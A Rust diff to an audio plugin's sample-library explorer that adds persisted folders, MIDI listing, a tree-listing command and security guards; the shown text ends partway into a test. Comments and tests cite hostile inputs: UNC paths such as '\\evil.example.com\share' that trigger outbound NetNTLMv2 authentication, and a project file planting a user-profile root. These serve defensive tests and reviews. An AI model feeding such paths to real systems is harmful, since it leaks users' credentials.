@@ -36,14 +36,17 @@
 use std::path::{Path, PathBuf};
 use std::sync::{Arc, Mutex};
 
-use serde::Serialize;
+use serde::{Deserialize, Serialize};
 
 /// The audio extensions [`crate::audio::import`] can actually decode.
 ///
-/// ⚠ **The same list the Open dialog filters on**, and it has to stay that way:
-/// a file the explorer offers and the loader refuses is a row that does nothing
-/// when you drop it, with no way for the producer to tell why.
-const AUDIO: &[&str] = &["wav", "aif", "aiff", "flac", "mp3", "m4a", "ogg", "oga"];
+/// ⛔ **Re-exported from `engine::formats`, not restated.** This was its own
+/// literal and the Open dialog's filter in `oneshot.rs` was another — two copies
+/// that happened to agree, with nothing making them and nothing that would have
+/// noticed when they stopped. TASK-058 calls that out by name: a file the
+/// explorer offers and the loader refuses is a row that does nothing when you
+/// drop it, with no way for the producer to tell why.
+use engine::formats::{kind_of, Kind, AUDIO};
 
 /// How many entries one folder may list.
 ///
@@ -58,9 +61,129 @@ const MAX_ENTRIES: usize = 2_000;
 /// ⛔ **`MAX_ENTRIES` bounds a listing; nothing bounded the root count.** The
 /// list arrives from a project file, and `open` and `state()` both walk every
 /// root canonicalising as they go — so 100,000 roots is 100,000 syscalls per
-/// poll on the thread the host draws its window from. Two dozen is past any
-/// real library.
-const MAX_ROOTS: usize = 24;
+/// poll on the thread the host draws its window from.
+///
+/// ⛔⛔ **Eight, and it is the producer's number rather than a safety margin.**
+/// Mike, 2026-08-10: *"i should be able to have up to 8 folders in the view to be
+/// able to be tabbed to be used and sifted through at any given time, and if you
+/// want to add more, then you have to exit out of one of them."* It was 24 — a
+/// bound chosen to stop a hostile project file, which it still does; what it did
+/// not do was give the page a rule it could show, so the ninth folder simply
+/// vanished. The page disables **Add folder** at eight; this refuses a ninth
+/// however it arrives, because a disabled button is a UI state and this is the
+/// real bound.
+pub const MAX_ROOTS: usize = 8;
+
+/// How many roots may be *carried* — as opposed to added.
+///
+/// ⛔⛔ **These are two different numbers and conflating them destroyed data.**
+/// [`MAX_ROOTS`] is what a producer may *add up to*; this is what a project or a
+/// `library.json` written by an older build may legitimately still contain. It was
+/// 24 before the tab strip, and lowering the stored bound to 8 truncated existing
+/// projects — which `explorer_state` then wrote back, deleting the rest for good.
+///
+/// ⚠ It is still a bound rather than trust: `state()` canonicalises every root on
+/// the editor thread, so an unbounded list from a hostile file is a syscall storm
+/// per poll. Twenty-four is what shipped, and is past any real library.
+const MAX_STORED_ROOTS: usize = 24;
+
+/// What is written to `library.json`.
+///
+/// A struct rather than a bare array so a later field — a favourite, a per-folder
+/// note — does not need a new file and a migration. Same reasoning `eula::Record`
+/// records for the same reason.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+#[serde(rename_all = "camelCase", default)]
+struct Library {
+    folders: Vec<String>,
+}
+
+/// Where the sample library lives between sessions.
+///
+/// ⛔⛔ **Per user, not per project, and that is Mike's own rule arriving where
+/// it was never actually applied.** He chose a saved library over a folder picker
+/// on 2026-08-07 because *"a library is set up once, not once per project"* — and
+/// then the only place it was written was `PluginSession::sample_folders`, which
+/// the **host** serialises into the project file. So it came back with an `.als`
+/// and never with the standalone. Mike, 2026-08-10: *"the folders should persist
+/// between app openings."*
+///
+/// ⚠ **`eula.rs` had already written down the distinction this needed**: a
+/// property of *this person on this machine* does not belong in a blob that
+/// travels inside a song you send to a label.
+///
+/// ⚠ The project blob is still read and still written — see
+/// `Shared::restore_sample_folders`. Dropping it would lose the library of every
+/// project saved before this, and a producer who set one up per project is not
+/// wrong to expect it back.
+fn library_path() -> Option<PathBuf> {
+    crate::presets::data_dir().map(|dir| dir.join("library.json"))
+}
+
+/// The folders this machine had last time, or empty if there is no record.
+pub fn saved_folders() -> Vec<String> {
+    library_path()
+        .and_then(|path| std::fs::read_to_string(path).ok())
+        .and_then(|text| serde_json::from_str::<Library>(&text).ok())
+        .map(|library| library.folders)
+        .unwrap_or_default()
+}
+
+/// Write the library for next time.
+///
+/// ⚠ **Failure is swallowed deliberately.** This runs when a producer adds or
+/// removes a folder, and the folder *is* added either way — the panel already
+/// shows it. Surfacing "could not write your library" over a working action would
+/// be an error about the next session, raised during this one, with nothing the
+/// producer can do about it. It is logged where the plugin's other disk problems
+/// are.
+fn save_folders(folders: &[String]) {
+    let Some(path) = library_path() else { return };
+    if let Some(parent) = path.parent() {
+        if let Err(error) = std::fs::create_dir_all(parent) {
+            nih_plug::nih_log!("could not create {parent:?} for the sample library: {error}");
+            return;
+        }
+    }
+    let library = Library {
+        folders: folders.to_vec(),
+    };
+    // ⛔ **Temp-and-rename**, for the reason `favourites::write` gives: this is a
+    // whole-list rewrite of state the producer cannot reconstruct, and a
+    // truncated file reads back as an empty library.
+    match serde_json::to_string_pretty(&library) {
+        Ok(text) => {
+            if let Err(error) = crate::patterns::write_atomic(&path, &text) {
+                nih_plug::nih_log!("could not write the sample library: {error}");
+            }
+        }
+        Err(error) => nih_plug::nih_log!("could not serialise the sample library: {error}"),
+    }
+}
+
+/// The library to restore, from the project's copy and this machine's.
+///
+/// ⛔ **Both, rather than one winning.** Dropping the project's copy loses the
+/// library of every project saved before `library.json` existed; dropping the
+/// machine's puts back the bug where a standalone launch has no folders at all.
+///
+/// ⚠ The project's come first: a producer who opened *this song* most likely
+/// wants its folders at the front, and [`Explorer::restore`] keeps the first
+/// [`MAX_ROOTS`].
+pub fn merge_folders(from_project: Vec<String>, from_machine: Vec<String>) -> Vec<String> {
+    let mut folders = from_project;
+    for folder in from_machine {
+        // ⚠ Compared as written. Two spellings of one folder is the bug
+        // `same_or_inside` records twice over — but these are both raw paths
+        // saved the way the producer added them, and canonicalising here would
+        // touch the filesystem for every root on every load, including the
+        // unplugged-drive case this list deliberately keeps.
+        if !folders.contains(&folder) {
+            folders.push(folder);
+        }
+    }
+    folders
+}
 
 /// One row in the explorer.
 #[derive(Debug, Clone, Serialize)]
@@ -72,6 +195,15 @@ pub struct Entry {
     pub path: String,
     /// Folders sort first and open on click; files are draggable.
     pub is_dir: bool,
+    /// `"dir"`, `"audio"` or `"midi"`.
+    ///
+    /// ⛔⛔ **Two kinds, two sets of affordances, and the panel may not confuse
+    /// them** — TASK-058's rule, stated as a field so the page cannot get it
+    /// wrong per call site. An audio file gets the waveform, the audition and a
+    /// drum pad. A `.mid` gets a piano-roll thumbnail, playback and
+    /// drag-to-generator; **a waveform for a `.mid`, or a pad assignment for
+    /// one, is a control that can only fail.**
+    pub kind: &'static str,
 }
 
 /// What the page draws.
@@ -170,11 +302,32 @@ impl Explorer {
         // unplugged-drive kindness above deliberately keeps a root that cannot
         // be resolved — but a remote path is not an absent drive, and keeping
         // it would leave the payload armed in the project for the next load.
+        // ⛔⛔ **NOT `.take(MAX_ROOTS)` — that was a data-loss bug.** Found by a
+        // code review, 2026-08-10, and introduced the same night by lowering the
+        // bound from 24 to 8 for the tab strip.
+        //
+        // A project saved under the old bound can legally carry twelve folders.
+        // Truncating on load would be survivable on its own; what made it
+        // destructive is `explorer_state` — it calls `store_sample_folders()` on
+        // **every poll**, writing the surviving list straight back over
+        // `session.sample_folders`. So the four dropped folders were gone from
+        // the producer's project the next time the host saved, and gone from
+        // `library.json` the next time they added or removed one. Silently.
+        //
+        // ▶ **A bound on what the page may ADD is not a licence to delete what a
+        // producer already had.** `pick` refuses a ninth; the tab strip shows
+        // however many are really there. Over the bound the panel is crowded,
+        // which the producer can see and fix — the opposite of a loss they
+        // cannot.
         let kept: Vec<PathBuf> = paths
             .iter()
             .map(PathBuf::from)
             .filter(|path| crate::oneshot::refuse_remote(path).is_ok())
-            .take(MAX_ROOTS)
+            .filter(|path| is_plausible_library(path))
+            // ⚠ A bound is still needed against a hostile file — `state()` walks
+            // every root canonicalising on the editor thread — but it is far
+            // above any real library rather than at the UI's tab count.
+            .take(MAX_STORED_ROOTS)
             .collect();
         if let Ok(mut roots) = self.roots.lock() {
             *roots = kept;
@@ -187,6 +340,11 @@ impl Explorer {
         if let Ok(mut roots) = self.roots.lock() {
             roots.retain(|root| root != &target);
         }
+        // ⚠ Written here rather than on the `explorer_state` poll: the poll runs
+        // every 500ms for the life of the editor, and a JSON write at that rate
+        // inside somebody's DAW is a cost for nothing. Adding and removing are
+        // the only two things that change the library.
+        save_folders(&self.snapshot());
         // ⛔ Otherwise the list loses the folder and the pane goes on showing
         // its contents, with no root highlighted and no way back — a view of
         // something that is no longer in the library.
@@ -206,6 +364,25 @@ impl Explorer {
     /// which is how it already learns about everything else that happens off
     /// the editor thread.
     pub fn pick(&self) -> Result<(), String> {
+        // ⛔⛔ **Refused at [`MAX_ROOTS`], before the dialog opens.** Mike,
+        // 2026-08-10: *"if you want to add more, then you have to exit out of one
+        // of them."* The page disables **Add folder** at eight, so this is the
+        // path nobody should reach — and it is here anyway because a disabled
+        // button is a UI state and the bound is a real one. ⚠ Refused *before*
+        // the dialog rather than after: letting a producer browse to a folder and
+        // then telling them it cannot be added is the worse half of both.
+        {
+            let roots = self
+                .roots
+                .lock()
+                .map_err(|_| "the explorer is unavailable")?;
+            if roots.len() >= MAX_ROOTS {
+                return Err(format!(
+                    "you can browse {MAX_ROOTS} folders at a time — close one to add another"
+                ));
+            }
+        }
+
         {
             let mut picking = self
                 .picking
@@ -227,9 +404,21 @@ impl Explorer {
                     // Adding a folder twice is a no-op rather than a second
                     // identical row, which is what a producer means when they
                     // add one they already have.
-                    if !roots.contains(&dir) {
+                    // ⚠ The bound is re-checked here as well as before the
+                    // dialog: this runs minutes later on another thread, and the
+                    // invariant is "never more than `MAX_ROOTS`" rather than
+                    // "the count was fine when we asked".
+                    if !roots.contains(&dir) && roots.len() < MAX_ROOTS {
                         roots.push(dir.clone());
                     }
+                    // ⚠ Inside the lock's scope, from the snapshot we already
+                    // hold, so the file cannot disagree with the list in memory.
+                    let folders: Vec<String> = roots
+                        .iter()
+                        .filter_map(|root| root.to_str().map(str::to_owned))
+                        .collect();
+                    drop(roots);
+                    save_folders(&folders);
                 }
                 // Show it straight away — adding a folder in order to then
                 // click it is a step nobody wants.
@@ -301,6 +490,54 @@ impl Explorer {
         Ok(())
     }
 
+    /// Read one folder's rows **without moving where the producer is browsing**.
+    ///
+    /// ⛔⛔ **This is what makes a tree possible at all.** Mike, 2026-08-10:
+    /// *"you need to show it like a real file explorer does, where the main
+    /// folder is at the top, and then indents and shows the subfolders underneath
+    /// and then the files beneath that."* A tree has **several** folders open at
+    /// once; [`Explorer::state`] answers for exactly one, because `folder` is a
+    /// single slot. Expanding a node through `open` would therefore collapse the
+    /// idea of "where I am" into "the last thing I clicked", and the *selected*
+    /// folder is not decoration — [`crate::oneshot::OneShots::randomize`] rolls a
+    /// pad from it.
+    ///
+    /// So: `open` still means "this is the folder I am working from", and this
+    /// means "also show me what is in that one". Two questions, two commands.
+    ///
+    /// ⚠ **Still one folder per call.** The module header's argument stands —
+    /// walking a producer's whole library on the editor thread would stall the
+    /// host. The page asks for a folder when the producer expands it, which is
+    /// the same amount of work `open` already did, at the same moment.
+    ///
+    /// ⚠ Guarded exactly like `open`: remote first (before any syscall touches
+    /// the path), then containment.
+    pub fn list_one(&self, dir: &str) -> Result<State, String> {
+        let path = PathBuf::from(dir);
+        // ⛔ FIRST, before `is_dir` — the reason `open` gives: on Windows a
+        // syscall against a UNC path *is* the outbound authentication.
+        crate::oneshot::refuse_remote(&path)?;
+
+        // The one message all three failures share, for the reason `open`
+        // records: distinct wording is a filesystem oracle.
+        let refused = || String::from("that is not a folder in your sample library");
+        if !path.is_dir() {
+            return Err(refused());
+        }
+        let real = path.canonicalize().map_err(|_| refused())?;
+
+        let roots = self
+            .roots
+            .lock()
+            .map_err(|_| "the explorer is unavailable")?;
+        if !roots.iter().any(|root| same_or_inside(root, &real)) {
+            return Err(refused());
+        }
+        drop(roots);
+
+        Ok(list(&real))
+    }
+
     /// Is `path` inside a folder the producer added?
     ///
     /// ⚠ **The same test `open` applies, exposed so the file-reading commands
@@ -308,6 +545,28 @@ impl Explorer {
     /// from the page; the explorer must only describe and audition what it
     /// would list.
     pub fn contains(&self, path: &Path) -> bool {
+        // ⛔⛔ **REMOTE FIRST, BEFORE THE CANONICALISE BELOW.** A security review
+        // found this inverted on 2026-08-10 and it was a live credential leak.
+        //
+        // `canonicalize` on Windows is `CreateFileW` + `GetFinalPathNameByHandleW`
+        // — on a UNC string that is **not a read**. It is the SMB redirector
+        // resolving the host, connecting out and performing a session setup that
+        // sends the logged-in user's NetNTLMv2 credentials. `\\host@SSL@443\s\a`
+        // does the same over WebDAV on 443, so blocking 445 does not save you.
+        //
+        // ⛔ **The guard belongs HERE rather than at each call site**, which is
+        // the whole finding: `favourites_add` applied containment *before* the
+        // remote check and `explorer_drop` did the same, so one bridge message
+        // with a `\\attacker\share\x.wav` path authenticated outbound and was
+        // then politely told the file "is not in your sample library" — the
+        // credentials already gone. Every other command had the order right.
+        // Putting it in the one function that syscalls on a raw page string
+        // makes the invariant unforgettable for the next command that grows a
+        // `contains` call, which is exactly how both of these arrived.
+        if crate::oneshot::refuse_remote(path).is_err() {
+            return false;
+        }
+
         // ⛔⛔ **Canonicalised HERE, because `same_or_inside`'s fallback is only
         // conservative for `open`.** `open` resolves the incoming path before
         // comparing, so its fallback pits a resolved path against a raw root
@@ -355,6 +614,7 @@ impl Explorer {
                         .to_owned(),
                     path: path.to_owned(),
                     is_dir: true,
+                    kind: "dir",
                 })
             })
             .collect();
@@ -429,12 +689,21 @@ fn list(dir: &Path) -> State {
                     name: name.to_owned(),
                     path: text.to_owned(),
                     is_dir: true,
+                    kind: "dir",
                 });
-            } else if is_audio(&path) {
+            } else if let Some(kind) = kind_of(&path) {
+                // ⛔ **MIDI is listed alongside audio now** — Mike, 2026-08-10:
+                // *"i want to be able to view .mid files in the File
+                // Explorer."* It was filtered out entirely, which is why
+                // `explorer_midi` shipped with nothing able to reach it.
                 files.push(Entry {
                     name: name.to_owned(),
                     path: text.to_owned(),
                     is_dir: false,
+                    kind: match kind {
+                        Kind::Audio => "audio",
+                        Kind::Midi => "midi",
+                    },
                 });
             }
         }
@@ -547,6 +816,43 @@ pub fn waveform(explorer: &Explorer, path: &str) -> Result<Waveform, String> {
     })
 }
 
+/// Could this plausibly be a folder somebody keeps samples in?
+///
+/// ⛔⛔ **Because the containment boundary is defined by an UNTRUSTED blob.**
+/// Found by a security review, 2026-08-10. `sample_folders` rides the
+/// `#[persist]` state, so a shared `.als`, preset or type-beat starter can carry
+/// `"sampleFolders": ["C:\\Users"]` — an ordinary local path that
+/// `refuse_remote` passes. `restore` then installs it, and because `contains` is
+/// `real.starts_with(root)`, **every containment check in the plugin is
+/// satisfied for that whole tree**. The page could walk it with `explorer_list`,
+/// read `.mid` content back through `explorer_song`, decode any audio through
+/// `explorer_waveform`, and star-then-`reveal` any file in it — the one command
+/// that launches a process.
+///
+/// ▶ **This does not make the blob trusted; it removes the useful targets.**
+/// A drive root and a user-profile root are the two shapes worth planting and
+/// neither is a sample library — nobody adds `C:\` or `C:\Users\them` as one.
+/// A folder the producer genuinely picked is always deeper than that.
+///
+/// ⚠ **Depth, not a name list.** Blocking `C:\Users` by spelling would miss
+/// `C:\Users\..\Users`, every non-English profile root and every other OS. Two
+/// components under the prefix is the rule, and it is the same rule on all
+/// three platforms.
+///
+/// ⚠ **Only on the way in from a FILE.** `Explorer::pick` does not go through
+/// this: a producer who genuinely wants to add a shallow folder through the
+/// native dialog is choosing it, which is the distinction the whole guard turns
+/// on.
+fn is_plausible_library(path: &Path) -> bool {
+    use std::path::Component;
+    // Prefix and root separator are not folders anybody chose.
+    let depth = path
+        .components()
+        .filter(|part| matches!(part, Component::Normal(_)))
+        .count();
+    depth >= 2
+}
+
 /// Is `path` the same folder as `root`, or inside it?
 ///
 /// ⛔ **Both sides canonicalised, and mixing the two spellings is a bug this
@@ -575,6 +881,98 @@ fn is_audio(path: &Path) -> bool {
         .unwrap_or(false)
 }
 
+/// The longest MIDI file this will read, in bytes.
+///
+/// A four-bar loop is a couple of kilobytes; a megabyte is a type-1 orchestral
+/// score, and reading one into a training set is not what anybody meant. Bounded
+/// before the read rather than after, so an enormous file costs a `metadata`
+/// call rather than the memory.
+const MAX_MIDI_BYTES: u64 = 1 << 20;
+
+/// Read a `.mid` from the producer's own library as a trainable pattern
+/// (TASK-040T).
+///
+/// ⛔ **The same two guards `waveform` needs, and for the same reasons.** The
+/// path arrives from the page: `refuse_remote` first, because a UNC path makes
+/// the SMB redirector authenticate outward before any containment check could
+/// refuse it; then containment, because the module's claim is that browsing
+/// cannot leave the folders the producer added, and a reader that ignored it
+/// would be a second door out of the library.
+pub fn midi_pattern(
+    explorer: &Explorer,
+    path: &str,
+    part: engine::pattern::Part,
+) -> Result<engine::pattern::Pattern, String> {
+    let (bytes, name) = read_midi_bytes(explorer, path)?;
+    engine::smf_read::smf_to_pattern(&bytes, part, &name)
+}
+
+/// The bytes of a `.mid` in the library, and the name to give what comes out.
+///
+/// ⛔ **Every guard the two MIDI commands share, in one place.** They were about
+/// to be two copies of the same four checks — remote, containment, extension,
+/// size — and this codebase's own record is that the second copy is the one that
+/// drifts. `explorer::AUDIO` and the Open dialog's filter had exactly that shape
+/// until `engine::formats` took it away.
+fn read_midi_bytes(explorer: &Explorer, path: &str) -> Result<(Vec<u8>, String), String> {
+    let file = Path::new(path);
+    // ⛔ First, before any syscall touches it — the reason `open` gives.
+    crate::oneshot::refuse_remote(file)?;
+
+    // ⚠ **One error for every outcome**, as `open` does: distinct messages
+    // would let a page map the disk one probe at a time.
+    let refused = || String::from("that is not a MIDI file in your sample library");
+    if !explorer.contains(file) {
+        return Err(refused());
+    }
+    // ⚠ `engine::formats`, not a third spelling of the extension list.
+    if kind_of(file) != Some(Kind::Midi) {
+        return Err(refused());
+    }
+
+    let size = std::fs::metadata(file)
+        .map(|meta| meta.len())
+        .map_err(|_| refused())?;
+    if size > MAX_MIDI_BYTES {
+        return Err("that MIDI file is too large to train from".into());
+    }
+
+    let bytes = std::fs::read(file).map_err(|_| refused())?;
+    let name = file
+        .file_stem()
+        .map(|stem| stem.to_string_lossy().into_owned())
+        .unwrap_or_else(|| "imported".to_owned());
+    Ok((bytes, name))
+}
+
+/// Separate a layered `.mid` into the generators its voices belong to.
+///
+/// ⛔ Mike, 2026-08-10: *"split it into the proper generators if it is a layered
+/// melody file with the bass and countermelody included."*
+///
+/// ⚠ **The same two guards, in the same order, as every other path command.**
+/// The only difference from [`midi_pattern`] is which engine function reads the
+/// bytes — so the checks are lifted into [`read_midi_bytes`] rather than written
+/// twice, because a second copy is the one that would drift.
+pub fn midi_split(
+    explorer: &Explorer,
+    path: &str,
+) -> Result<Vec<engine::smf_read::SplitPart>, String> {
+    let (bytes, name) = read_midi_bytes(explorer, path)?;
+    engine::smf_read::split(&bytes, &name)
+}
+
+/// Read a whole `.mid` as an arrangement, for the Song tab.
+///
+/// ⛔ Mike, 2026-08-10: *"could you put the midi for the entire song into the
+/// 'Song' tab and allow them to pick which parts they want for the generators,
+/// just like you would for a generation, but using someone elses song as the
+/// starting point?"*
+pub fn midi_song(explorer: &Explorer, path: &str) -> Result<engine::pattern::Song, String> {
+    let (bytes, name) = read_midi_bytes(explorer, path)?;
+    engine::smf_read::smf_to_song(&bytes, &name)
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -593,10 +991,11 @@ mod tests {
     }
 
     #[test]
-    fn lists_audio_and_folders_and_nothing_else() {
+    fn lists_audio_and_midi_and_folders_and_nothing_else() {
         let dir = temp("listing");
         std::fs::write(dir.join("kick.wav"), b"x").unwrap();
         std::fs::write(dir.join("snare.WAV"), b"x").unwrap();
+        std::fs::write(dir.join("riff.mid"), b"x").unwrap();
         std::fs::write(dir.join("notes.txt"), b"x").unwrap();
         std::fs::write(dir.join("cover.png"), b"x").unwrap();
         std::fs::create_dir_all(dir.join("Kicks")).unwrap();
@@ -605,12 +1004,21 @@ mod tests {
         let state = list(&dir);
         let names: Vec<&str> = state.entries.iter().map(|e| e.name.as_str()).collect();
 
-        // Folders first, then audio, each by name. The extension check is
+        // Folders first, then the files, each by name. The extension check is
         // case-insensitive because a sample library is full of `.WAV`.
-        assert_eq!(names, vec!["Kicks", "kick.wav", "snare.WAV"]);
+        assert_eq!(names, vec!["Kicks", "kick.wav", "riff.mid", "snare.WAV"]);
         assert!(!state.truncated);
         assert!(state.entries[0].is_dir, "the folder sorts first");
-        assert!(!state.entries[1].is_dir, "then the audio files");
+        assert!(!state.entries[1].is_dir, "then the files");
+
+        // ⛔⛔ **Two kinds, and the page is told which.** Mike, 2026-08-10:
+        // *"i want to be able to view .mid files in the File Explorer."* They
+        // were filtered out entirely before, which is why `explorer_midi`
+        // shipped with nothing able to reach it. ⚠ The kind is what stops the
+        // panel offering a waveform or a drum pad for a `.mid` — controls that
+        // can only fail on one.
+        let kinds: Vec<&str> = state.entries.iter().map(|e| e.kind).collect();
+        assert_eq!(kinds, vec!["dir", "audio", "midi", "audio"]);
 
         let _ = std::fs::remove_dir_all(&dir);
     }
@@ -637,6 +1045,193 @@ mod tests {
         let state = list(Path::new("this-folder-does-not-exist-anywhere"));
         assert!(state.entries.is_empty());
         assert!(!state.truncated);
+    }
+
+    /// ⛔⛔ **Browsing has to go more than one folder deep.**
+    ///
+    /// Mike, 2026-08-10: *"you can get to the subfolders list, but you cannot go
+    /// into those subfolders."* And he was right — for a reason no test here
+    /// could see, because every one of them opened a folder by a path it had
+    /// built itself rather than by the path the **page** would have been handed.
+    ///
+    /// `open` stores `canonicalize`'s answer, which on Windows is `\\?\C:\…`.
+    /// `list` then builds every row from `entry.path()` under that, so the rows
+    /// wear the prefix too — and `refuse_remote` classified anything starting
+    /// `\\` as a network path. Opening a root worked (roots are stored as they
+    /// were added); opening a child of one was refused, every time.
+    ///
+    /// ⚠ **The assertion walks the entry, deliberately.** Re-deriving the
+    /// subfolder path with `dir.join("Kicks")` is what the old tests did and it
+    /// is exactly what hid this: the bug lives in the round trip through
+    /// `state()`, not in either end of it.
+    #[test]
+    fn a_subfolder_can_be_opened_from_the_row_the_page_was_given() {
+        let dir = temp("descend");
+        std::fs::create_dir_all(dir.join("Kicks").join("Vinyl")).unwrap();
+        std::fs::write(dir.join("Kicks").join("kick-01.wav"), b"x").unwrap();
+
+        let explorer = Explorer::default();
+        explorer.restore(&[dir.to_str().unwrap().to_owned()]);
+        explorer
+            .open(dir.to_str().unwrap())
+            .expect("the root opens");
+
+        // The row as the page received it — canonical prefix and all.
+        let listed = explorer.state();
+        let kicks = listed
+            .entries
+            .iter()
+            .find(|entry| entry.name == "Kicks")
+            .expect("the subfolder is listed");
+
+        explorer
+            .open(&kicks.path)
+            .expect("a listed subfolder must open");
+
+        // ...and it is genuinely inside it, two levels down from the root.
+        let inside = explorer.state();
+        let names: Vec<&str> = inside.entries.iter().map(|e| e.name.as_str()).collect();
+        assert_eq!(names, vec!["Vinyl", "kick-01.wav"]);
+
+        // The third level too, which is where a real library actually lives.
+        let vinyl = inside
+            .entries
+            .iter()
+            .find(|entry| entry.name == "Vinyl")
+            .expect("the sub-subfolder is listed");
+        explorer
+            .open(&vinyl.path)
+            .expect("a sub-subfolder must open as well");
+
+        // ⛔ And the file rows are usable too — `contains` is what `explorer_drop`,
+        // `preview_load` and `explorer_waveform` all gate on, so a row that lists
+        // but does not pass this is a sample that cannot be previewed or dropped.
+        let file = listed
+            .entries
+            .iter()
+            .find(|entry| !entry.is_dir)
+            .or_else(|| inside.entries.iter().find(|entry| !entry.is_dir))
+            .expect("a sample is listed");
+        assert!(
+            explorer.contains(Path::new(&file.path)),
+            "a listed sample must be reachable: {}",
+            file.path
+        );
+        assert!(
+            crate::oneshot::refuse_remote(Path::new(&file.path)).is_ok(),
+            "a listed sample must not read as a network path: {}",
+            file.path
+        );
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// ⛔ **Expanding a node must not move the folder the producer is working
+    /// from.** `randomize` rolls a pad from the *selected* folder, so if opening
+    /// a twisty re-pointed that, expanding a branch to look at it would silently
+    /// change what the dice draws from.
+    #[test]
+    fn listing_a_folder_leaves_the_browse_location_where_it_was() {
+        let dir = temp("list-one");
+        std::fs::create_dir_all(dir.join("Kicks")).unwrap();
+        std::fs::write(dir.join("Kicks").join("kick-01.wav"), b"x").unwrap();
+        std::fs::write(dir.join("clap.wav"), b"x").unwrap();
+
+        let explorer = Explorer::default();
+        explorer.restore(&[dir.to_str().unwrap().to_owned()]);
+        explorer
+            .open(dir.to_str().unwrap())
+            .expect("the root opens");
+        let before = explorer.state().folder;
+
+        let kicks = explorer
+            .list_one(dir.join("Kicks").to_str().unwrap())
+            .expect("a contained folder lists");
+        let names: Vec<&str> = kicks.entries.iter().map(|e| e.name.as_str()).collect();
+        assert_eq!(names, vec!["kick-01.wav"]);
+
+        assert_eq!(
+            explorer.state().folder,
+            before,
+            "expanding a node is not navigating to it"
+        );
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// The same two guards every other path command applies. A new command that
+    /// reads a folder is a new door, and it gets the same lock.
+    #[test]
+    fn listing_applies_containment_and_refuses_a_remote_path() {
+        let dir = temp("list-guards");
+        let outside = temp("list-outside");
+        std::fs::create_dir_all(outside.join("secret")).unwrap();
+
+        let explorer = Explorer::default();
+        explorer.restore(&[dir.to_str().unwrap().to_owned()]);
+
+        let error = explorer
+            .list_one(outside.join("secret").to_str().unwrap())
+            .expect_err("a folder outside the library must be refused");
+        assert!(error.contains("sample library"), "{error}");
+
+        let error = explorer
+            .list_one(r"\\evil.example.com\share")
+            .expect_err("a remote path must be refused");
+        assert!(error.contains("network path"), "{error}");
+
+        let _ = std::fs::remove_dir_all(&dir);
+        let _ = std::fs::remove_dir_all(&outside);
+    }
+
+    /// ⛔⛔ **The library has to survive the app closing** — Mike, 2026-08-10:
+    /// *"the folders should persist between app openings."*
+    ///
+    /// It only ever lived in `PluginSession::sample_folders`, which the host
+    /// writes into the **project file** — so it came back with an `.als` and
+    /// never with a standalone launch, which has no project to come back from.
+    /// `library.json` is the per-user half; this is the rule that joins them.
+    #[test]
+    fn the_project_and_the_machine_libraries_are_merged_without_duplicates() {
+        let merged = merge_folders(
+            vec!["C:/from-project".into(), "C:/shared".into()],
+            vec!["C:/shared".into(), "C:/from-machine".into()],
+        );
+
+        // The project's first, the machine's appended, and the folder both knew
+        // about listed once rather than twice.
+        assert_eq!(
+            merged,
+            vec![
+                "C:/from-project".to_owned(),
+                "C:/shared".to_owned(),
+                "C:/from-machine".to_owned(),
+            ]
+        );
+    }
+
+    #[test]
+    fn a_standalone_with_no_project_still_gets_its_library_back() {
+        // The case the bug was actually about: nothing from the project, and the
+        // machine's list is the whole answer rather than an empty browser.
+        let merged = merge_folders(Vec::new(), vec!["C:/samples".into()]);
+        assert_eq!(merged, vec!["C:/samples".to_owned()]);
+    }
+
+    #[test]
+    fn the_saved_library_survives_a_json_round_trip() {
+        // ⚠ A struct rather than a bare array, so a later field does not need a
+        // new file and a migration — and `default` so a file written by an older
+        // build still reads.
+        let text = serde_json::to_string(&Library {
+            folders: vec!["C:/samples".into()],
+        })
+        .expect("the library serialises");
+        let back: Library = serde_json::from_str(&text).expect("and reads back");
+        assert_eq!(back.folders, vec!["C:/samples".to_owned()]);
+
+        let empty: Library = serde_json::from_str("{}").expect("an older file still reads");
+        assert!(empty.folders.is_empty());
     }
 
     #[test]
@@ -846,13 +1441,101 @@ mod tests {
     }
 
     #[test]
+    fn reading_midi_applies_the_same_two_guards_as_every_other_path_command() {
+        // ⛔⛔ **Asserted together, because the last time this file grew a
+        // command it grew with only one of them.** `explorer_drop` applied
+        // `refuse_remote` and not containment, and a security review had to
+        // find it. A third door — this one — is exactly where that repeats, so
+        // both halves are pinned here rather than trusted.
+        use engine::pattern::Part;
+
+        let explorer = Explorer::default();
+
+        // The remote guard, and it must fire *before* containment — a UNC
+        // string makes the SMB redirector authenticate outward on the first
+        // syscall, so refusing afterwards is cold comfort.
+        let remote = midi_pattern(
+            &explorer,
+            "\\\\evil.example.com\\share\\a.mid",
+            Part::Melody,
+        )
+        .unwrap_err();
+        assert!(
+            !remote.contains("sample library"),
+            "a UNC path must be refused by the remote guard first: {remote}"
+        );
+
+        // And containment: a real, readable file outside the library is refused
+        // in the same words as one that does not exist, so the page cannot use
+        // this to map the disk.
+        let dir = temp("midi-outside");
+        let outside = dir.join("loop.mid");
+        std::fs::write(&outside, b"MThd").unwrap();
+
+        let uncontained =
+            midi_pattern(&explorer, outside.to_str().unwrap(), Part::Melody).unwrap_err();
+        let missing = midi_pattern(
+            &explorer,
+            dir.join("nope.mid").to_str().unwrap(),
+            Part::Melody,
+        )
+        .unwrap_err();
+        assert_eq!(
+            uncontained, missing,
+            "existing and missing must be indistinguishable outside the library"
+        );
+    }
+
+    #[test]
     fn a_project_file_cannot_plant_more_roots_than_anyone_has() {
         // `MAX_ENTRIES` bounded a listing; nothing bounded the root count, and
         // every root is canonicalised on every poll.
-        let many: Vec<String> = (0..MAX_ROOTS * 10).map(|i| format!("/root/{i}")).collect();
+        let many: Vec<String> = (0..MAX_STORED_ROOTS * 10)
+            .map(|i| format!("/root/{i}"))
+            .collect();
         let explorer = Explorer::default();
         explorer.restore(&many);
-        assert_eq!(explorer.snapshot().len(), MAX_ROOTS);
+        assert_eq!(explorer.snapshot().len(), MAX_STORED_ROOTS);
+    }
+
+    /// ⛔⛔ **Loading a project must never delete folders out of it.**
+    ///
+    /// Found by a code review, 2026-08-10. The tab strip lowered the *add* bound
+    /// to eight and `restore` truncated to the same number — so a project saved
+    /// under the old bound of 24 lost the rest on load, and `explorer_state`
+    /// wrote the survivors straight back over `session.sample_folders`, making
+    /// the loss permanent the next time the host saved. Silently.
+    #[test]
